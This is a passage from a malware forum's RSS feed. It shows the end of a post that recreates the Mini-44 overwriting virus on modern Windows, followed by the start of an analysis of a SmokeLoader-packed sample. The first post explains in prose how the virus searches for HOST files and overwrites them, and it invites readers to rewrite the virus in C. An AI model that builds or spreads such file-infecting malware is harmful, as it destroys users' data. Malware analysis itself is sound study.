<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/9/9b2df91a33d6c18295dbfcf1aafa301675da562f.png" data-download-href="/uploads/short-url/m8MvidbNiDNdlyDCozcdNMImdBR.png?dl=1" title=""><img src="/uploads/default/original/2X/9/9b2df91a33d6c18295dbfcf1aafa301675da562f.png" alt="" data-base62-sha1="m8MvidbNiDNdlyDCozcdNMImdBR" width="513" height="117" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/9/9b2df91a33d6c18295dbfcf1aafa301675da562f_2_10x10.png"></a></div><p></p>
<p>You can learn a lot from the Microsoft offical documentation.</p>
<p>Then I execute lines 140-143</p>
<p><img src="/uploads/default/original/2X/b/bf9e3ae728f20071ed06490bbe5e03c40da54832.png" alt="" data-base62-sha1="rl8cBkqTg46tfjvqZm0zz8GGkX8" width="506" height="89"></p>
<p>I advance <strong>EBX</strong> to the <strong>SizeOfImage</strong> field and save it. Please read on that value yourself. Notice that I first save the size of the virus file inside <strong>EDI</strong>, we’ll see how this is utilized later.</p>
<p>Now the file infection begins at line 146-156</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/8/8a66f1be4a22933d47c8acff4e9aec74f3d3c47c.png" data-download-href="/uploads/short-url/jKmrMs3I6U0s5IPMMsWnVXvmQcA.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8a66f1be4a22933d47c8acff4e9aec74f3d3c47c_2_571x156.png" alt="" data-base62-sha1="jKmrMs3I6U0s5IPMMsWnVXvmQcA" width="571" height="156" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8a66f1be4a22933d47c8acff4e9aec74f3d3c47c_2_571x156.png, https://0x00sec.s3.amazonaws.com/optimized/2X/8/8a66f1be4a22933d47c8acff4e9aec74f3d3c47c_2_856x234.png 1.5x, /uploads/default/original/2X/8/8a66f1be4a22933d47c8acff4e9aec74f3d3c47c.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8a66f1be4a22933d47c8acff4e9aec74f3d3c47c_2_10x10.png"></a></div><p></p>
<p>I invoke <strong>GetModuleFileName</strong> again and save the current executing file name inside a global variable. Then at line 151 I invoke <strong>FindFirstFileA</strong> which should return a search handle to a file found by a specified search parameter</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/3/39055ae27aa0e73cd044a892246bea7a6d11c023.png" data-download-href="/uploads/short-url/88qGI5CXxYIFnEMmh0nKmzlYAsX.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/3/39055ae27aa0e73cd044a892246bea7a6d11c023_2_624x20.png" alt="" data-base62-sha1="88qGI5CXxYIFnEMmh0nKmzlYAsX" width="624" height="20" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/3/39055ae27aa0e73cd044a892246bea7a6d11c023_2_624x20.png, /uploads/default/original/2X/3/39055ae27aa0e73cd044a892246bea7a6d11c023.png 1.5x, /uploads/default/original/2X/3/39055ae27aa0e73cd044a892246bea7a6d11c023.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/39055ae27aa0e73cd044a892246bea7a6d11c023_2_10x10.png"></a></div><p></p>
<p>Only file names that start with the string <strong>HOST</strong> inside a specifc directory, if the search handle is returned it is saved inside <strong>hSearchHandle</strong>, the handle is printed and then we jump to lines 164-186</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/e/e7618251bf7a05dacda60062870d5a0a59c22488.png" data-download-href="/uploads/short-url/x0TcT3u2v3GrxaEYbjHNr64V2qY.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e7618251bf7a05dacda60062870d5a0a59c22488_2_624x294.png" alt="" data-base62-sha1="x0TcT3u2v3GrxaEYbjHNr64V2qY" width="624" height="294" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e7618251bf7a05dacda60062870d5a0a59c22488_2_624x294.png, https://0x00sec.s3.amazonaws.com/optimized/2X/e/e7618251bf7a05dacda60062870d5a0a59c22488_2_936x441.png 1.5x, /uploads/default/original/2X/e/e7618251bf7a05dacda60062870d5a0a59c22488.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e7618251bf7a05dacda60062870d5a0a59c22488_2_10x10.png"></a></div><p></p>
<p>First I construct the new file named using <strong>sprintf</strong>. <strong>FindFirstFileA</strong> fills up a data structure we pass to it called <strong>WIN32_FIND_DATA</strong> which contains a filed called cFileName which contains the name of the file but not its full path. So I invoke <strong>sprintf</strong> to construct the full path to that file with its name. At line 170 I compare the viruses full name against the new found file, if they match the virus will execute the NEXT label which simply runs <strong>FindNextFileA</strong>, this function will look for the next file in the directory.</p>
<p>If the file names do not match, I invoke <strong>CreateFileA</strong> to open a handle to the found host file.</p>
<p>I execute lines 188-194</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/9/9a55a89192709f84d0acd937a8e6cf7e65931b0d.png" data-download-href="/uploads/short-url/m1j3hgatVovpEH1KOqFKvB3P21f.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/9/9a55a89192709f84d0acd937a8e6cf7e65931b0d_2_624x150.png" alt="" data-base62-sha1="m1j3hgatVovpEH1KOqFKvB3P21f" width="624" height="150" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/9/9a55a89192709f84d0acd937a8e6cf7e65931b0d_2_624x150.png, /uploads/default/original/2X/9/9a55a89192709f84d0acd937a8e6cf7e65931b0d.png 1.5x, /uploads/default/original/2X/9/9a55a89192709f84d0acd937a8e6cf7e65931b0d.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/9/9a55a89192709f84d0acd937a8e6cf7e65931b0d_2_10x10.png"></a></div><p></p>
<p>I use <strong>WriteFile</strong> to overwrite the host file with the virus buffer stored in the memory location returned by <strong>VirtualAlloc</strong>. Notice how I use <strong>EDI</strong> to pass the virus file size. I then close the file and jump to NEXT which will look for the next file. If another file is not found the virus will simply terminate.</p>
<p><img src="/uploads/default/original/2X/a/acd0b0172eb1b0d42cbaa87bc54c18e5888bcf56.png" alt="" data-base62-sha1="oENeFq4hVmLKXASNjgcdyxt8NO6" width="441" height="230"></p>
<p>The file <strong>HOST1.exe</strong> and <strong>HOST2.exe</strong> are overwritten. If we load them into the debugger now they would execute the virus.</p>
<p>We reacted the <strong>Mini-44</strong> virus inside a modern windows environment! How cool is that!<br>
A cool thing about this virus that you can re-create it in C with relative ease, so as homework(which you don’t have to do) I recommend the reader re-creates this virus using C.</p>
<h2><span>Conclusions</span></h2>
<p>In this post, we learned the basics of Windows internals and DOS internals which laid up the basics for malware development under Windows environment. On the next post we’ll learn:</p>
<ol>
<li>How Parastic viruses worked and how they latch on to DOS EXE files</li>
<li>We’ll execute the Hillary virus on Windows 95</li>
<li>We’ll how to bypass ASLR and use the .reloc section in the PE file to our advantage.</li>
<li>How to overwrite a specific section of a PE file instead of destroying it completely</li>
<li>Use creative ways to minimize our infecting code size</li>
</ol>
<p>See you guys next time!</p>
<p><strong><span>Sources</span></strong></p>
<aside class="onebox amazon">
  <header class="source">
      <a href="https://www.amazon.com/Giant-Black-Book-Computer-Viruses/dp/144140712X?tag=0x00sec03-20" target="_blank" rel="noopener nofollow ugc">amazon.com</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:259/400;"><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/6/26e4e806391fbe734d56c920875b437221078564.jpeg" class="thumbnail" width="259" height="400"></div>

<h3><a href="https://www.amazon.com/Giant-Black-Book-Computer-Viruses/dp/144140712X?tag=0x00sec03-20" target="_blank" rel="noopener nofollow ugc">The Giant Black Book Of Computer Viruses, 2Nd Edition

</a></h3>


<p>
  4.4 out of 5 stars, 
  
  
  
  <strong></strong>
</p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p><a href="http://static1.esetstatic.com/us/resources/white-papers/TDL3-Analysis.pdf" class="onebox" target="_blank" rel="noopener nofollow ugc">http://static1.esetstatic.com/us/resources/white-papers/TDL3-Analysis.pdf</a></p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      
      <a href="https://web.archive.org/web/20111012123012/http:/technoglobes.com/2011/07/indestructible-tdl4-botnet/" target="_blank" rel="noopener nofollow ugc">Techno Globes</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:610/375;"><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/2/22eb3a5cf74d69d30ed197896f91e1465b3cfcbb.png" class="thumbnail" width="610" height="375"></div>

<h3><a href="https://web.archive.org/web/20111012123012/http:/technoglobes.com/2011/07/indestructible-tdl4-botnet/" target="_blank" rel="noopener nofollow ugc">“Indestructible” TDL-4 Botnet?</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox wikipedia">
  <header class="source">
      <a href="https://en.wikipedia.org/wiki/Alureon" target="_blank" rel="noopener nofollow ugc">en.wikipedia.org</a>
  </header>
  <article class="onebox-body">
    

<h3><a href="https://en.wikipedia.org/wiki/Alureon" target="_blank" rel="noopener nofollow ugc">Alureon</a></h3>

<p>Alureon (also known as TDSS or TDL-4) is a trojan and bootkit created to steal data by intercepting a system's network traffic and searching for: banking usernames and passwords, credit card data, PayPal information, social security numbers, and other sensitive user data.  Following a series of customer complaints, Microsoft determined that Alureon caused a wave of BSoDs on some 32-bit Microsoft Windows systems. The update, MS10-015, triggered these crashes by breaking assumptions made by t Accor...</p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/2/d/2d6546caf7126668146d1633d19c450c18c2ce75.gif" class="site-icon" width="16" height="16">
      <a href="http://virus.wikidot.com/cih" target="_blank" rel="noopener nofollow ugc">virus.wikidot.com</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="http://virus.wikidot.com/cih" target="_blank" rel="noopener nofollow ugc">Cih - The Virus Encyclopedia</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox wikipedia">
  <header class="source">
      <a href="https://en.wikipedia.org/wiki/Trojan_horse_(computing)" target="_blank" rel="noopener nofollow ugc">en.wikipedia.org</a>
  </header>
  <article class="onebox-body">
    <img src="/uploads/default/original/2X/e/eb2d9e7dd50f8ff3ec9677cee3f5bfc45f3aee94.png" class="thumbnail onebox-full-image" width="12" height="16">

<h3><a href="https://en.wikipedia.org/wiki/Trojan_horse_(computing)" target="_blank" rel="noopener nofollow ugc">Trojan horse (computing)</a></h3>

<p>

 In computing, a Trojan horse, or trojan, is any malware which misleads users of its true intent. The term is derived from the Ancient Greek story of the deceptive Trojan Horse that led to the fall of the city of Troy.
 Trojans are generally spread by some form of social engineering, for example where a user is duped into executing an email attachment disguised to appear not suspicious, (e.g., a routine form to be filled in), or by clicking on some fake advertisement on social media or anywhere...</p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox wikipedia">
  <header class="source">
      <a href="https://en.wikipedia.org/wiki/Computer_worm" target="_blank" rel="noopener nofollow ugc">en.wikipedia.org</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4675cb53002aa75ce12372bd4398c7613228dcc2.jpeg" class="thumbnail" width="" height="">

<h3><a href="https://en.wikipedia.org/wiki/Computer_worm" target="_blank" rel="noopener nofollow ugc">Computer worm</a></h3>

<p>A computer worm is a standalone malware computer program that replicates itself in order to spread to other computers. It often uses a computer network to spread itself, relying on security failures on the target computer to access it. It will use this machine as a host to scan and infect other computers. When these new worm-invaded computers are controlled, the worm will continue to scan and infect other computers using these computers as hosts, and this behavior will continue. Computer wo Many ...</p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://archive.org/details/TheGiantBlackBookOfComputerViruses2ndEd./mode/2up" target="_blank" rel="noopener nofollow ugc">Internet Archive</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:180/282;"><img src="/uploads/default/original/2X/c/c3ea30995fae799fede80a9015795d9569b22dad.jpeg" class="thumbnail" width="180" height="282"></div>

<h3><a href="https://archive.org/details/TheGiantBlackBookOfComputerViruses2ndEd./mode/2up" target="_blank" rel="noopener nofollow ugc">The Giant Black Book Of Computer Viruses ( 2nd Ed.) : Free Download, Borrow,...</a></h3>

<p>A &nbsp;good book on computer viruses.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p><a href="http://www.openrce.org/reference_library/files/reference/PE%20Format.pdf" class="onebox" target="_blank" rel="noopener nofollow ugc">http://www.openrce.org/reference_library/files/reference/PE%20Format.pdf</a></p>
            <p><small>12 posts - 8 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/the-art-of-malware-bringing-the-dead-back-to-life/19599">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/the-art-of-malware-bringing-the-dead-back-to-life/19599</link>
          <pubDate>Tue, 03 Mar 2020 22:34:47 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-19599</guid>
          <source url="https://d.clarkee.co.uk/t/the-art-of-malware-bringing-the-dead-back-to-life/19599.rss">The Art Of Malware - Bringing the dead back to life</source>
        </item>
        <item>
          <title>Analyzing Modern Malware Techniques - Part 4</title>
          <dc:creator><![CDATA[Danus]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h2><a name="p-53180-analyzing-modern-malware-techniques-part-4-1" class="anchor" href="https://d.clarkee.co.uk#p-53180-analyzing-modern-malware-techniques-part-4-1"></a>Analyzing Modern Malware Techniques - Part 4</h2>
<h3><a name="p-53180-im-afraid-of-no-packerpart-1-of-2-2" class="anchor" href="https://d.clarkee.co.uk#p-53180-im-afraid-of-no-packerpart-1-of-2-2"></a>I’m afraid of no packer(Part 1 of 2)</h3>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/f/f7feab28b8c58f0f563080d9420eba6a8b6d5be5.png" data-download-href="/uploads/short-url/znRyJaLJucGf973ikjJ0ifkMhtX.png?dl=1" title=""><img src="/uploads/default/original/2X/f/f7feab28b8c58f0f563080d9420eba6a8b6d5be5.png" alt="" data-base62-sha1="znRyJaLJucGf973ikjJ0ifkMhtX" width="168" height="144" role="presentation"></a></div><p></p>
<hr>
<h3><a name="p-53180-preface-3" class="anchor" href="https://d.clarkee.co.uk#p-53180-preface-3"></a>Preface:</h3>
<p>If you’re going to analyze malware you are going to run into packers, code injections, obfuscated code and what not. If one doesn’t possess the correct knowledge or the correct tools to deal with such problems he will not get far with his analysis. In fact, when I first started practicing malware analysis somewhere back in 2015 I stopped because I couldn’t understand how to unpack packed code and I quit trying, So I tried again around 2017.. and I quit again. This in time(in 2019) I didn’t quit but only because I had the proper tools to deal with the problem. Packed code is usually a dynamic problem and by that I mean that most of the time when you’ll encounter a packed malware it’s not going to be the same packed code but if you’ll have the tools to deal with the problem I guess you could defeat any packer. Still I’m to remain humble and admit that I still don’t have enough experience to deal with all types of packed code but I’m hoping that today, my dear reader, together we can bring more experience into our reverse engineering arsenal to learn together how to defeat packed code. I would like to put my efforts in this post to find anti analysis techniques that bypass my Scylla-Hide plugin and to learn how to de obfuscate binaries to ease analysis. Let’s begin!</p>
<hr>
<p><strong>Required knowledge:</strong></p>
<ul>
<li>Basic understanding in code injections</li>
<li>Basic understanding in dealing with anti analysis</li>
<li>A solid grasp of C and WINAPI</li>
<li>A solid grasp of x86 Assembly</li>
<li>Experience with IDAPRO</li>
<li>Experience with x64dbg</li>
</ul>
<p><strong>Required Tools:</strong></p>
<ul>
<li>IDA Pro</li>
<li>x64dbg</li>
<li>Resource Hacker</li>
<li>PEBear</li>
<li>Process Explorer</li>
<li>Process Monitor</li>
<li>VMWare</li>
</ul>
<p><strong>Sample used:</strong></p>
<p><a href="https://www.hybrid-analysis.com/sample/3d2777b748e805c0463c0c6d0fef8280ad197bea1dd0a25e30ed71199989a6b9?environmentId=100" rel="noopener nofollow ugc">3d2777b748e805c0463c0c6d0fef8280ad197bea1dd0a25e30ed71199989a6b9</a></p>
<p><strong>Goal setting:</strong></p>
<ol>
<li>Find and bypass anti analysis techniques.</li>
<li>Unpack main payload so we could analyze and run it.</li>
<li>Extract basic host based IOC and network based IOC.</li>
</ol>
<blockquote>
<p><strong>Some side notes</strong>:<br>
I highly encourage you to download the sample and follow my execution paths. As I begin to dive into shellcode analysis here it will be highly difficult to follow me in the post itself as I would begin to traverse offsets and I would not be making a picture of every location I access.</p>
</blockquote>
<hr>
<h2><a name="p-53180-basic-analysis-4" class="anchor" href="https://d.clarkee.co.uk#p-53180-basic-analysis-4"></a>Basic Analysis:</h2>
<p>I was encouraged by a few users in <a href="http://0x00sec.org" rel="noopener nofollow ugc">0x00sec.org</a> to check out this sample, It was stated that this sample was packed by <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.smokeloader" rel="noopener nofollow ugc">SmokeLoader</a> and it performs some pretty cool anti-analysis tricks, so off I went.</p>
<h2><a name="p-53180-basic-static-analysis-5" class="anchor" href="https://d.clarkee.co.uk#p-53180-basic-static-analysis-5"></a>Basic Static Analysis:</h2>
<p><strong>Anti Analysis APIs:</strong></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/7/76d9e8ad1cb9d81739f923097e0e11fd1b22abc8.png" data-download-href="/uploads/short-url/gXpcY0DLK12rzxbMQWUJIcoWdg4.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/7/76d9e8ad1cb9d81739f923097e0e11fd1b22abc8_2_602x196.png" alt="" data-base62-sha1="gXpcY0DLK12rzxbMQWUJIcoWdg4" width="602" height="196" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/7/76d9e8ad1cb9d81739f923097e0e11fd1b22abc8_2_602x196.png, https://0x00sec.s3.amazonaws.com/optimized/2X/7/76d9e8ad1cb9d81739f923097e0e11fd1b22abc8_2_903x294.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/7/76d9e8ad1cb9d81739f923097e0e11fd1b22abc8_2_1204x392.png 2x"></a></div><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/a/a7141244273f370cfbc3d22e011cc10bf6f707ef.png" data-download-href="/uploads/short-url/nQ2JTtK3gLNnekyPCzrgggX9BsH.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/a/a7141244273f370cfbc3d22e011cc10bf6f707ef_2_602x123.png" alt="" data-base62-sha1="nQ2JTtK3gLNnekyPCzrgggX9BsH" width="602" height="123" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/a/a7141244273f370cfbc3d22e011cc10bf6f707ef_2_602x123.png, https://0x00sec.s3.amazonaws.com/optimized/2X/a/a7141244273f370cfbc3d22e011cc10bf6f707ef_2_903x184.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/a/a7141244273f370cfbc3d22e011cc10bf6f707ef_2_1204x246.png 2x"></a></div><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/c/c0405ce3e351b7790ff0104f7947eeae8a5e6ecc.png" data-download-href="/uploads/short-url/rqJzpjqujsQkalq68cHvXAPrY3a.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c0405ce3e351b7790ff0104f7947eeae8a5e6ecc_2_602x63.png" alt="" data-base62-sha1="rqJzpjqujsQkalq68cHvXAPrY3a" width="602" height="63" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c0405ce3e351b7790ff0104f7947eeae8a5e6ecc_2_602x63.png, https://0x00sec.s3.amazonaws.com/optimized/2X/c/c0405ce3e351b7790ff0104f7947eeae8a5e6ecc_2_903x94.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/c/c0405ce3e351b7790ff0104f7947eeae8a5e6ecc_2_1204x126.png 2x"></a></div><p></p>
<p><strong>Dynamic API Resolving:</strong></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/0/040ebed14c9059aa45fef0efc390d6a0555ac5d2.png" data-download-href="/uploads/short-url/zTv6AMxewzVLYxhJFC5ewvO4Xo.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/0/040ebed14c9059aa45fef0efc390d6a0555ac5d2_2_602x193.png" alt="" data-base62-sha1="zTv6AMxewzVLYxhJFC5ewvO4Xo" width="602" height="193" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/0/040ebed14c9059aa45fef0efc390d6a0555ac5d2_2_602x193.png, https://0x00sec.s3.amazonaws.com/optimized/2X/0/040ebed14c9059aa45fef0efc390d6a0555ac5d2_2_903x289.png 1.5x, /uploads/default/original/2X/0/040ebed14c9059aa45fef0efc390d6a0555ac5d2.png 2x"></a></div><p></p>
<p><strong>Uncommon section in PE file:</strong></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/6/66f53764551bce8a7f17d2a7f7849d0f926c97d3.png" data-download-href="/uploads/short-url/eGO4GMsRZQrCvjK1pMRHdFMF0TF.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/66f53764551bce8a7f17d2a7f7849d0f926c97d3_2_602x64.png" alt="" data-base62-sha1="eGO4GMsRZQrCvjK1pMRHdFMF0TF" width="602" height="64" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/66f53764551bce8a7f17d2a7f7849d0f926c97d3_2_602x64.png, https://0x00sec.s3.amazonaws.com/optimized/2X/6/66f53764551bce8a7f17d2a7f7849d0f926c97d3_2_903x96.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/6/66f53764551bce8a7f17d2a7f7849d0f926c97d3_2_1204x128.png 2x"></a></div><p></p>
<p>And that’s it. That is very undetailed for hybrid-analysis. No connections being made, No files dropped, no code injection detection’s no nothing.</p>
<p>Let’s look at the sample on disk.</p>
<p>So I start off by viewing the Imports and the list seems pretty full and we have some strings which are well..:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/6/69655c0af5d33b260a7f86ac53343c1bd9ac9f73.png" data-download-href="/uploads/short-url/f2nimEija5AnkbtqBS7u7xWieav.png?dl=1" title=""><img src="/uploads/default/original/2X/6/69655c0af5d33b260a7f86ac53343c1bd9ac9f73.png" alt="" data-base62-sha1="f2nimEija5AnkbtqBS7u7xWieav" width="602" height="271" role="presentation"></a></div><p></p>
<p>Not very informative, the rest of the strings look like auto-generated by the compiler so it’s not much use to us.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/f/fbc5d67fdf587eaddefbdb459ae19c5135b725bf.png" data-download-href="/uploads/short-url/zVhI4kA1ZGB2CIrIugC2tdhDigv.png?dl=1" title=""><img src="/uploads/default/original/2X/f/fbc5d67fdf587eaddefbdb459ae19c5135b725bf.png" alt="" data-base62-sha1="zVhI4kA1ZGB2CIrIugC2tdhDigv" width="602" height="496" role="presentation"></a></div><p></p>
<p>TLS calls are never a good thing, TLS is <a href="https://en.wikipedia.org/wiki/Thread-local_storage" rel="noopener nofollow ugc">Thread Local Storage</a>, it’s code that is usually stored in a different section and runs before the entry point or it might be allocated and created using TLS API calls, but there is no TLS section in this binary. Just a strangely named section called <strong>.mysec</strong> which doesn’t contain any code:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/f/f29057e65c4d456b837a782d8ca3c9f79f1cee58.png" data-download-href="/uploads/short-url/yBONJ9oMUDpOTgE8I4jb2x2wfxu.png?dl=1" title=""><img src="/uploads/default/original/2X/f/f29057e65c4d456b837a782d8ca3c9f79f1cee58.png" alt="" data-base62-sha1="yBONJ9oMUDpOTgE8I4jb2x2wfxu" width="602" height="97" role="presentation"></a></div><p></p>
<p>but it contains a lot of storage, infact I viewed its full size and its 4095 bytes long. we’ll keep that in mind.</p>
<p>In addition, there is a strange artifact in the samples resource section:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/e/ef3ff96efeaa69dd79bfca40931ec56b0607b04d.png" data-download-href="/uploads/short-url/y8vb9lfGL3ZfN12yHHclhvbHxiR.png?dl=1" title=""><img src="/uploads/default/original/2X/e/ef3ff96efeaa69dd79bfca40931ec56b0607b04d.png" alt="" data-base62-sha1="y8vb9lfGL3ZfN12yHHclhvbHxiR" width="602" height="255" role="presentation"></a></div><p></p>
<p>It looks to long(35769 bytes long) to be a valid resource unless its a video format, we’ll keep this in mind as well.</p>
<p><strong>Basic Dynamic Analysis:</strong></p>
<p>So let’s run this on our Dynamic Analysis machine, I’ll set process monitor to watch the application and we’ll take a look at it in process explorer.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/9/9e54500c1706fbbe1410e978d0a94b9b74777619.png" data-download-href="/uploads/short-url/mAE4Vj2OWUlJyWDzPuDNUw53pRD.png?dl=1" title=""><img src="/uploads/default/original/2X/9/9e54500c1706fbbe1410e978d0a94b9b74777619.png" alt="" data-base62-sha1="mAE4Vj2OWUlJyWDzPuDNUw53pRD" width="602" height="237" role="presentation"></a></div><p></p>
<p><img src="/uploads/default/original/2X/1/18bb0eaaddf8f1c1ad510bf5527fc60c288afa29.gif" alt="" data-base62-sha1="3wMe7gqwDz1wrrHv2MOKYX6Dgtr" width="602" height="277" role="presentation" class="animated"></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/f/f8d815054732f1bcabd9bffde8b3a5e5958a6e46.png" data-download-href="/uploads/short-url/zvnmIFRb3oTAta72GtxttqHlG8C.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f8d815054732f1bcabd9bffde8b3a5e5958a6e46_2_602x331.png" alt="" data-base62-sha1="zvnmIFRb3oTAta72GtxttqHlG8C" width="602" height="331" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f8d815054732f1bcabd9bffde8b3a5e5958a6e46_2_602x331.png, /uploads/default/original/2X/f/f8d815054732f1bcabd9bffde8b3a5e5958a6e46.png 1.5x, /uploads/default/original/2X/f/f8d815054732f1bcabd9bffde8b3a5e5958a6e46.png 2x"></a></div><p></p>
<p>That’s not true actually, I’m not surprised at all. but we do have something interesting here - it appears that the sample spawned a new sub process:</p>
<p><img src="/uploads/default/original/2X/4/4ca2e6c28e3f496d4ba485f313c323c02894b2e3.png" alt="" data-base62-sha1="aVXiKs6XzNpvr7HjjK7Xsngby4r" width="602" height="27" role="presentation"></p>
<p>which is a legitimate Windows Application, that might come in handy! so let’s move on to the advanced analysis!</p>
<hr>
<h2><a name="p-53180-advanced-analysis-finding-obfuscation-and-anti-analysis-tricks-6" class="anchor" href="https://d.clarkee.co.uk#p-53180-advanced-analysis-finding-obfuscation-and-anti-analysis-tricks-6"></a>Advanced Analysis - Finding Obfuscation and Anti Analysis Tricks:</h2>
<p>Our goal here is to find obfuscation techniques and anti analysis techniques, I’m going to find ways to circumvent them, instead of skipping these like I usually do we’ll park at each technique we find and see how we can deal with it.</p>
<p>Before we continue, I want to mention that <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.smokeloader" rel="noopener nofollow ugc">SmokeLoader </a>is simply a loader aiding the main payload in covert launching. According to Hybrid Analysis that was linked before and <a href="https://maltiverse.com/sample/3d2777b748e805c0463c0c6d0fef8280ad197bea1dd0a25e30ed71199989a6b9" rel="noopener nofollow ugc">Maltiverse</a>, the final payload is ransomware(GandCrab according to Maltiverse).</p>
<p>Let’s start by looking at <strong>WinMain</strong> in IDA:</p>
<p>looking at <strong>loc_4011C5</strong> we can see a lot of local variables being initialized:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/1/1815326a7341e4c207ca849f62e2ab7f12c33ad4.png" data-download-href="/uploads/short-url/3r2S9NTLJxRHn5B5e2pGCMibCJe.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1815326a7341e4c207ca849f62e2ab7f12c33ad4_2_235x499.png" alt="" data-base62-sha1="3r2S9NTLJxRHn5B5e2pGCMibCJe" width="235" height="499" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1815326a7341e4c207ca849f62e2ab7f12c33ad4_2_235x499.png, /uploads/default/original/2X/1/1815326a7341e4c207ca849f62e2ab7f12c33ad4.png 1.5x, /uploads/default/original/2X/1/1815326a7341e4c207ca849f62e2ab7f12c33ad4.png 2x"></a></div><p></p>
